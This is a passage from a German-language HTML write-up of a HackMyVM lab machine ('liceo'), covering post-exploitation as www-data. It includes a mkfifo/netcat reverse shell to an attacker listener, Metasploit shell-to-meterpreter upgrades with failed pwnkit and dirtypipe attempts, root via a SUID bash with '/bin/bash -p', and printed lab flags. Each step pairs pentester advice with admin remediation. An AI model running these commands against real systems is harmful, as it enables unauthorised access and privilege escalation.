+                <strong>Analyse:</strong> In der `www-data`-Shell wird in das Web-Root-Verzeichnis (`/var/www/html`, impliziert durch `cd ..`) gewechselt und der Inhalt aufgelistet. Anschließend wird ein Python-HTTP-Server gestartet, um die Datei `liceoweb.zip` zum Download bereitzustellen. Auf dem Angreifer-System wird `wget` verwendet, um diese Datei herunterzuladen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Listing zeigt die Struktur der Webanwendung, einschließlich des Upload-Skripts und des Upload-Verzeichnisses. Die Datei `liceoweb.zip` ist interessant, da sie möglicherweise Quellcode oder andere relevante Daten enthält. Der Transfer der Datei mittels Python-HTTP-Server und `wget` ist erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Entpacke und analysiere den Inhalt von `liceoweb.zip` auf dem Angreifer-System. Suche nach Konfigurationsdateien, Passwörtern, Quellcode oder anderen Hinweisen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Archive oder Backups im Web-Root-Verzeichnis liegen. Beschränken Sie die Berechtigungen des `www-data`-Benutzers. Überwachen Sie ausgehende Verbindungen vom Webserver.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+bash-5.1$ <span class="command">cd ..</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+bash-5.1$ <span class="command">ls -la</span>
+                    </div>
+                    <pre>
+total 592
+drwxr-xr-x 7 root     root       4096 Feb 10 23:58 .
+drwxr-xr-x 3 root     root       4096 Feb 10 19:26 ..
+drwxr-xr-x 2 www-data www-data   4096 Sep 16  2020 css
+drwxr-xr-x 2 www-data www-data   4096 Sep 16  2020 images
+-rw-r--r-- 1 www-data www-data  21487 Feb 10 23:49 index.html
+drwxr-xr-x 2 www-data www-data   4096 Sep 16  2020 js
+-rw-r--r-- 1 www-data www-data 547090 Feb  4 18:01 liceoweb.zip
+drwxr-xr-x 2 www-data www-data   4096 Feb  3 06:39 spering-html
+-rw-r--r-- 1 www-data www-data   1501 Feb 10 23:58 upload.php
+drwxr-xr-x 2 www-data www-data   4096 Apr 30 12:08 uploads
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">python3 -m http.server 8000</span>
+                     </div>
+                     <pre>
+ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+ 192.168.2.199 - - [30/Apr/2024 12:13:58] "GET /liceoweb.zip HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">wget liceo.hmv:8000/liceoweb.zip</span>
+                     </div>
+                     <pre>
+ --2024-04-30 14:13:57--  http://liceo.hmv:8000/liceoweb.zip
+ Auflösen des Hostnamens liceo.hmv (liceo.hmv)… 192.168.2.113
+ Verbindungsaufbau zu liceo.hmv (liceo.hmv)|192.168.2.113|:8000 … verbunden.
+ HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 K
+ Länge: 547090 (534K) [application/zip]
+ Wird in liceoweb.zip gespeichert.
+
+ liceoweb.zip            100%[===================>] 534,27K  --.-KB/s    in 0,002s
+
+ 2024-04-30 14:13:57 (292 MB/s) - liceoweb.zip gespeichert [547090/547090]
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird in das `/home`-Verzeichnis gewechselt und dessen Inhalt aufgelistet. Anschließend wird in das Verzeichnis `/home/dev` gewechselt und dessen Inhalt sowie die Datei `user.txt` angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Im `/home`-Verzeichnis gibt es nur einen Benutzer: `dev`. Der `www-data`-Benutzer hat Lese- und Ausführungsrechte für dieses Verzeichnis (`drwxr-x---`), da er Mitglied der Gruppe `www-data` ist (impliziert durch die GID 33 und die Gruppenberechtigung). Im Home-Verzeichnis von `dev` befindet sich die Datei `user.txt`, die erfolgreich gelesen wird und die User-Flag `<span class="password">71ab613fa286844425523780a7ebbab2</span>` enthält. Auffällig ist auch die Verknüpfung von `.bash_history` nach `/dev/null`, was bedeutet, dass die Befehlshistorie für `dev` nicht gespeichert wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Untersuche das `.ssh`-Verzeichnis von `dev`. Fahre mit der Suche nach Privesc-Vektoren fort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen der Home-Verzeichnisse. Es ist ungewöhnlich, dass `www-data` Zugriff auf das Home-Verzeichnis eines anderen Benutzers hat. Die Verknüpfung der `.bash_history` nach `/dev/null` kann die Forensik erschweren und sollte untersucht werden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">cd /home/</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">ls -la</span>
+                     </div>
+                     <pre>
+ total 12
+ drwxr-xr-x  3 root root     4096 Jan 31 21:44 .
+ drwxr-xr-x 19 root root     4096 Jan 31 21:38 ..
+ drwxr-x---  5 dev  www-data 4096 Feb 11 00:10 dev
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">cd dev/</span>
+                     </div>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">ls -la</span>
+                     </div>
+                     <pre>
+ total 40
+ drwxr-x--- 5 dev  www-data 4096 Feb 11 00:10 .
+ drwxr-xr-x 3 root root     4096 Jan 31 21:44 ..
+ lrwxrwxrwx 1 root root        9 Feb 11 00:10 .bash_history -> /dev/null
+ -rw-r--r-- 1 dev  dev       220 Jan  6  2022 .bash_logout
+ -rw-r--r-- 1 dev  dev      3771 Jan  6  2022 .bashrc
+ drwx------ 2 dev  dev      4096 Jan 31 21:48 .cache
+ -rw------- 1 dev  dev        20 Feb 10 23:51 .lesshst
+ drwxrwxr-x 3 dev  dev      4096 Feb  1 14:24 .local
+ -rw-r--r-- 1 dev  dev       807 Jan  6  2022 .profile
+ drwx------ 2 dev  dev      4096 Jan 31 21:45 .ssh
+ -rw-r--r-- 1 dev  dev         0 Jan 31 21:51 .sudo_as_admin_successful
+ -rw-rw-r-- 1 dev  dev        33 Feb 10 19:18 user.txt
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">cat user.txt</span>
+                     </div>
+                     <pre>
+ <span class="password">71ab613fa286844425523780a7ebbab2</span>
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird nach SUID-Dateien (`find / -type f -perm -4000 -ls`) und Dateien mit Capabilities (`getcap -r /`) gesucht. Die Kernel-Version wird abgefragt (`uname -a`) und die `/etc/crontab` angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   **SUID:** Die Liste enthält viele Standard-Linux/Ubuntu SUID-Dateien (`passwd`, `su`, `sudo`, `pkexec`, etc.) sowie einige von `snapd` (`snap-confine`). Besonders interessant ist jedoch `/usr/bin/bash` mit `-rwsr-sr-x`-Berechtigungen! Das bedeutet, dass `bash` selbst mit SUID-Root ausgeführt werden kann. **Dies ist ein direkter Weg zur Privilege Escalation.**
+                *   **Capabilities:** Zeigt nur Standard-Capabilities für `ping`, `mtr-packet` und `gst-ptp-helper`. Kein offensichtlicher Privesc-Vektor hier.
+                *   **Kernel:** Linux 5.15.0-92-generic (Ubuntu). Relativ aktuell zum Zeitpunkt des Scans.
+                *   **Crontab:** Enthält nur Standard-System-Cronjobs (`cron.hourly`, `daily`, `weekly`, `monthly`). Kein benutzerdefinierter oder unsicherer Cronjob sichtbar.
+                Der Fund der SUID-Bash ist der entscheidende Punkt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die SUID-Bash zur Privilege Escalation: `/usr/bin/bash -p`. Die `-p`-Option sorgt dafür, dass Bash die effektive UID (hier Root) nicht auf die reale UID (www-data) fallen lässt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Entfernen Sie sofort das SUID-Bit von `/usr/bin/bash`!** (`chmod u-s /usr/bin/bash`). Dies ist eine extrem gefährliche Fehlkonfiguration. Untersuchen Sie, warum dieses Bit gesetzt wurde. Überprüfen Sie regelmäßig alle SUID/SGID-Dateien im System.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                     </div>
+                     <pre>
+       293    133 -rwsr-xr-x   1 root     root       135928 Mar 21 21:14 /snap/snapd/21465/usr/lib/snapd/snap-confine
+       297    129 -rwsr-xr-x   1 root     root       131832 Nov 29 14:54 /snap/snapd/20671/usr/lib/snapd/snap-confine
+       847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/2105/usr/bin/chfn
+       853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/2105/usr/bin/chsh
+       923     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/2105/usr/bin/gpasswd
+      1007     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/2105/usr/bin/mount
+      1016     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/2105/usr/bin/newgrp
+      1031     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/2105/usr/bin/passwd
+      1141     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/2105/usr/bin/su
+      1142    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/2105/usr/bin/sudo
+      1200     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/2105/usr/bin/umount
+      1289     51 -rwsr-xr--   1 root     systemd-resolve    51344 ct 25  2022 /snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+      1663    463 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /snap/core20/2105/usr/lib/openssh/ssh-keysign
+       847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
+       853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
+       922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
+      1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1974/usr/bin/mount
+      1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
+      1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
+      1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1974/usr/bin/su
+      1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
+      1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1974/usr/bin/umount
+      1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 ct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+      1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
+     10243    136 -rwsr-xr-x   1 root     root              138408 May 29  2023 /usr/lib/snapd/snap-confine
+      1410     36 -rwsr-xr--   1 root     messagebus         35112 ct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     38991    332 -rwsr-xr-x   1 root     root              338536 Jan  2 16:54 /usr/lib/openssh/ssh-keysign
+       875     60 -rwsr-xr-x   1 root     root               59976 Nov 24  2022 /usr/bin/passwd
+       897     32 -rwsr-xr-x   1 root     root               30872 Feb 26  2022 /usr/bin/pkexec
+       841     40 -rwsr-xr-x   1 root     root               40496 Nov 24  2022 /usr/bin/newgrp
+       696     72 -rwsr-xr-x   1 root     root               72072 Nov 24  2022 /usr/bin/gpasswd
+      1111     56 -rwsr-xr-x   1 root     root               55672 Feb 21  2022 /usr/bin/su
+       572     44 -rwsr-xr-x   1 root     root               44808 Nov 24  2022 /usr/bin/chsh
+       566     72 -rwsr-xr-x   1 root     root               72712 Nov 24  2022 /usr/bin/chfn
+       829     48 -rwsr-xr-x   1 root     root               47480 Feb 21  2022 /usr/bin/mount
+      1187     36 -rwsr-xr-x   1 root     root               35192 Feb 21  2022 /usr/bin/umount
+      1112    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
+      <span style="color:red; font-weight:bold;">517   1364 -rwsr-sr-x   1 root     root             1396520 Jan  6  2022 /usr/bin/bash</span>
+       680     36 -rwsr-xr-x   1 root     root               35200 Mar 23  2022 /usr/bin/fusermount3
+     13735     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">getcap -r / 2>/dev/null</span>
+                     </div>
+                     <pre>
+ /snap/core20/2105/usr/bin/ping cap_net_raw=ep
+ /snap/core20/1974/usr/bin/ping cap_net_raw=ep
+ /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+ /usr/bin/mtr-packet cap_net_raw=ep
+ /usr/bin/ping cap_net_raw=ep
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">uname -a</span>
+                     </div>
+                     <pre>
+ Linux liceoserver 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">cat /etc/crontab</span>
+                     </div>
+                     <pre>
+ # /etc/crontab: system-wide crontab
+ # Unlike any other crontab you don't have to run the `crontab'
+ # command to install the new version when you edit this file
+ # and files in /etc/cron.d. These files also have username fields,
+ # that none of the other crontabs do.
+
+ SHELL=/bin/sh
+ # You can also override PATH, but by default, newer versions inherit it from the environment
+ #PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+ # Example of job definition:
+ # .---------------- minute (0 - 59)
+ # |  .------------- hour (0 - 23)
+ # |  |  .---------- day of month (1 - 31)
+ # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+ # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+ # |  |  |  |  |
+ # *  *  *  *  * user-name command to be executed
+ 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+ 25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+ 47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+ 52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+ #
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">ls -la /etc/shadow</span>
+                     </div>
+                     <pre>
+ -rw-r----- 1 root shadow 1045 Feb 10 19:25 /etc/shadow
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">cat /etc/shadow</span>
+                     </div>
+                     <pre>
+ cat: /etc/shadow: Permission denied
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ bash-5.1$ <span class="command">echo "ben" >> /etc/shadow</span>
+                     </div>
+                     <pre>
+ bash: /etc/shadow: Permission denied
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-attempts">
+            <h2>Privilege Escalation Attempts (Metasploit)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, die bestehende einfache Reverse Shell (`www-data`) zu einer Meterpreter-Session aufzuwerten und anschließend über Metasploit nach lokalen Exploits zu suchen und diese auszuführen.
+                1.  Ein `multi/handler` wird für eine eingehende Shell auf Port 5555 vorbereitet.
+                2.  Auf der Zielmaschine wird ein Named Pipe (`/tmp/f`) erstellt und eine neue Shell gestartet, deren Ein-/Ausgabe über `nc` zum Listener auf Port 5555 geleitet wird. Dies etabliert eine (zweite) einfache Shell-Session in Metasploit (Session 1).
+                3.  Das Modul `multi/manage/shell_to_meterpreter` wird verwendet, um die einfache Shell (Session 1) zu einer Meterpreter-Session (Session 2) aufzuwerten.
+                4.  Es wird versucht, `pwnkit` (`exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec`) auf Session 2 anzuwenden.
+                5.  Nach dem Fehlschlag von pwnkit wird `local_exploit_suggester` auf Session 2 ausgeführt.
+                6.  Basierend auf dem Vorschlag wird `dirtypipe` (`exploit/linux/local/cve_2022_0847_dirtypipe`) auf Session 2 versucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   Die Aufwertung zu Meterpreter (Session 2) ist erfolgreich.
+                *   Der Pwnkit-Exploit (`cve_2021_4034`) schlägt fehl ("not-vulnerable"). Das System ist entweder gepatcht oder die Bedingungen sind nicht erfüllt.
+                *   Der `local_exploit_suggester` findet mehrere potenzielle Schwachstellen, darunter `dirtypipe` (CVE-2022-0847) für den Kernel 5.15.0.
+                *   Der DirtyPipe-Exploit (`cve_2022_0847`) wird ausgeführt, aber scheitert ebenfalls ("Exploit completed, but no session was created."). Obwohl der Kernel prinzipiell anfällig sein könnte, funktioniert dieser spezifische Exploit oder die Payload nicht.
+                Die Versuche, über bekannte Kernel-Exploits mittels Metasploit Root-Rechte zu erlangen, waren **nicht erfolgreich**.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da Kernel-Exploits fehlschlagen, konzentriere dich auf Fehlkonfigurationen wie SUID-Binaries (insbesondere die gefundene SUID-Bash). Überprüfe auch andere vom Suggester gemeldete Exploits (`netfilter_priv_esc_ipv4`, `pkexec`, `su_login`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie den Kernel und alle Systemkomponenten aktuell, um bekannte Schwachstellen wie Pwnkit oder DirtyPipe zu mitigieren. Überwachen Sie auf verdächtige Prozessausführungen und Exploit-Versuche.
+            </p>
+            <!-- Metasploit Handler Setup -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">
+msf6 > <span class="command">use multi/handler</span>
+                    </div>
+                    <pre>[*] Using configured payload generic/shell_reverse_tcp</pre>
+                     <div class="prompt metasploit-prompt">
+msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span>
+                     </div>
+                     <pre>lhost => eth0</pre>
+                     <div class="prompt metasploit-prompt">
+msf6 exploit(multi/handler) > <span class="command">set lport 5555</span>
+                     </div>
+                     <pre>lport => 5555</pre>
+                     <div class="prompt metasploit-prompt">
+msf6 exploit(multi/handler) > <span class="command">run</span>
+                     </div>
+                     <pre>[*] Started reverse TCP handler on 192.168.2.199:5555</pre>
+                 </div>
+             </div>
+             <!-- Reverse Shell Command auf Ziel -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+bash-5.1$ <span class="command">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 5555 >/tmp/f</span>
+                    </div>
+                    <pre>rm: cannot remove '/tmp/f': No such file or directory</pre>
+                 </div>
+             </div>
+             <!-- Metasploit Empfang und Upgrade -->
+             <div class="code-block">
+                <div class="terminal">
+                     <pre>
+ [*] Command shell session 1 opened (192.168.2.199:5555 -> 192.168.2.113:36256) at 2024-04-30 14:23:52 +0200
+
+ $ <span class="command">whoami</span> <!-- Beispielbefehl in Shell -->
+ www-data
+ $
+                     </pre>
+                     <div class="prompt metasploit-prompt">
+ Background session 1? [y/N]  <span class="command">y</span>
+                     </div>
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(multi/handler) > <span class="command">use multi/manage/shell_to_meterpreter</span>
+                     </div>
+                      <div class="prompt metasploit-prompt">
+ msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span>
+                     </div>
+                     <pre>session => 1</pre>
+                     <div class="prompt metasploit-prompt">
+ msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span>
+                     </div>
+                     <pre>
+ [*] Upgrading session ID: 1
+ [*] Starting exploit/multi/handler
+ [*] Started reverse TCP handler on 192.168.2.199:4433
+ [*] Sending stage (1017704 bytes) to 192.168.2.113
+ [*] Meterpreter session 2 opened (192.168.2.199:4433 -> 192.168.2.113:48246) at 2024-04-30 14:24:53 +0200
+ [*] Command stager progress: 100.00% (773/773 bytes)
+ [*] Post module execution completed
+                     </pre>
+                 </div>
+             </div>
+             <!-- Pwnkit Versuch -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</span> <!-- Index 1 im Text nicht sichtbar, Annahme -->
+                     </div>
+                      <pre>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp</pre>
+                      <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set session 2</span>
+                     </div>
+                     <pre>session => 2</pre>
+                      <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set lport 5554</span>
+                     </div>
+                     <pre>lport => 5554</pre>
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">set lhost eth0</span>
+                     </div>
+                     <pre>lhost => eth0</pre>
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">run</span>
+                     </div>
+                     <pre>
+ [*] Started reverse TCP handler on 192.168.2.199:5554
+ [*] Running automatic check ("set AutoCheck false" to disable)
+ [!] Verify cleanup of /tmp/.oesrvzb
+ [-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The target does not appear vulnerable "set ForceExploit true" to override check result.
+ [*] Exploit completed, but no session was created.
+                     </pre>
+                 </div>
+             </div>
+             <!-- Suggester und DirtyPipe Versuch -->
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > <span class="command">use post/multi/recon/local_exploit_suggester</span> <!-- Index 0 -->
+                     </div>
+                     <div class="prompt metasploit-prompt">
+ msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span>
+                     </div>
+                     <pre>session => 2</pre>
+                     <div class="prompt metasploit-prompt">
+ msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span>
+                     </div>
+                     <pre>
+ [*] 192.168.2.113 - Collecting local exploits for x86/linux...
+ [*] 192.168.2.113 - 193 exploit checks are being tried...
+ [+] 192.168.2.113 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ [+] 192.168.2.113 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
+ [+] 192.168.2.113 - exploit/linux/local/pkexec: The service is running, but could not be validated.
+ [+] 192.168.2.113 - exploit/linux/local/su_login: The target appears to be vulnerable.
+ [*] Running check method for exploit 62 / 62
+ [*] 192.168.2.113 - Valid modules for session 2:
+
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ 2   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
+ 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">
+ msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/linux/local/cve_2022_0847_dirtypipe</span>
+                     </div>
+                     <pre>[*] Using configured payload linux/x64/meterpreter/reverse_tcp</pre>
+                      <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set session 2</span>
+                     </div>
+                     <pre>session => 2</pre>
+                      <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lport 5554</span>
+                     </div>
+                     <pre>lport => 5554</pre>
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lhost eth0</span>
+                     </div>
+                     <pre>lhost => 192.168.2.199</pre>
+                     <div class="prompt metasploit-prompt">
+ msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span>
+                     </div>
+                     <pre>
+ [*] Started reverse TCP handler on 192.168.2.199:5554
+ [*] Running automatic check ("set AutoCheck false" to disable)
+ [+] The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ [*] Writing '/tmp/.iufdligymce' (35592 bytes) ...
+ [*] Executing exploit '/tmp/.iufdligymce /bin/passwd'
+ [*] Exploit completed, but no session was created.
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (SUID Bash)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach den fehlgeschlagenen Metasploit-Versuchen wird auf der `www-data`-Shell nach Dateien gesucht, die dem Benutzer `dev` gehören. Anschließend wird `/bin/bash -p` ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche nach `dev`-Dateien (`find / -user dev`) liefert keine neuen Privesc-Vektoren. Der entscheidende Schritt ist die Ausführung von `/bin/bash -p`. Da `/usr/bin/bash` (und oft auch `/bin/bash` als Symlink darauf) das SUID-Bit gesetzt hat (gefunden im früheren `find`-Befehl), startet dieser Befehl eine Bash-Shell, die ihre effektiven Root-Rechte beibehält (`euid=0(root)`). **Privilege Escalation zu Root war erfolgreich!**
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätige die Root-Rechte mit `id`. Wechsle ins `/root`-Verzeichnis und suche nach der Root-Flag.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Entfernen Sie sofort das SUID-Bit von `/usr/bin/bash` (`chmod u-s /usr/bin/bash`)!** Dies ist eine kritische Sicherheitslücke.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+bash-5.1$ <span class="command">find / -user dev 2>/dev/null</span>
+                    </div>
+                    <pre>
+/srv/ftp/note.txt
+/home/dev
+/home/dev/.bash_logout
+/home/dev/.local
+/home/dev/.local/share
+/home/dev/.cache
+/home/dev/.bashrc
+/home/dev/.sudo_as_admin_successful
+/home/dev/.lesshst
+/home/dev/.ssh
+/home/dev/user.txt
+/home/dev/.profile
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+bash-5.1$ <span class="command">/bin/bash -p</span>
+                    </div>
+                     <div class="prompt" style="color: red;"> <!-- Rot für neue Shell -->
+bash-5.1# <span class="command">id</span>
+                    </div>
+                    <pre>
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ bash-5.1# <span class="command">cd /root/</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ bash-5.1# <span class="command">ls</span>
+                     </div>
+                     <pre>
+ root.txt  snap
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ bash-5.1# <span class="command">cat root.txt</span>
+                     </div>
+                     <pre>
+ <span class="password">BF9A57023EDD8CFAB92B8EA516676B0D</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc-privesc">
+             <h2>Proof of Concept (Privilege Escalation - SUID Bash)</h2>
+              <p class="analysis">
+                 <strong>Analyse:</strong> Dieser POC beschreibt die Ausnutzung der SUID-Berechtigung auf der Bash-Binary zur Erlangung von Root-Rechten.
+             </p>
+              <p>
+                 <strong>Schwachstelle:</strong> Die Bash-Executable (`/usr/bin/bash` oder `/bin/bash`) hat das SUID-Bit gesetzt und gehört `root`.
+             </p>
+             <p>
